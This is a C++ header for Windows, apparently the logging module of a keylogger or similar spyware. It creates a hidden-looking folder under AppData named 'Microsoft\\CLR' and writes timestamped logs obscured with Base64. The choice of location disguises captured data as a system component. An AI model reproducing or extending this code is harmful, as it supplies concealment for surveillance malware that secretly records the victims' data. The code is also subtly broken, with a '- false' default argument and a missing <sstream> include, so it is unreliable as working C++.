#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
//Windows API
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_seperator - false)
    {
        //getenv - get environment function
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    bool MkOneDR(std::string path)
    {
        //always returns bool because of
        //"(bool)"
        return (bool)CreateDirectory(path.c_str(), NULL) ||
        GetLastError() == ERROR_ALREADY_EXISTS;
    }

    bool MKDir(std::string path)
    {
        for(char &c : path)
        {
            if(c == '\\')
            {
                // \0 is the null terminator
                c = '\0';
                if(!MkOneDR(path))
                {
                    return false;
                }
                c = '\\';
            }
        }
        return true;
    }

    template <class T>
    std::string WriteLog(const T &t)
    {
        std::string path = GetOurPath(true);
        Helper::DateTime dt;
        std::string name = dt.GetDateTimeString("_") + ".log";

        try
        {
            std::ofstream file(path + name);
            if(!file)
            {
                return "";
            }
            std::ostringstream s;
            s << "[" << dt.GetDateTimeString() << "]" <<
            std::endl << t << std::endl;
            std::string data = Base64::EncryptB64(s.str());
            file << data;
            if(!file)
            {
                return "";
            }
            file.close();
            return name;
        }
        catch(...)
        {
            return "";
        }
    }
}
#endif // IO_H
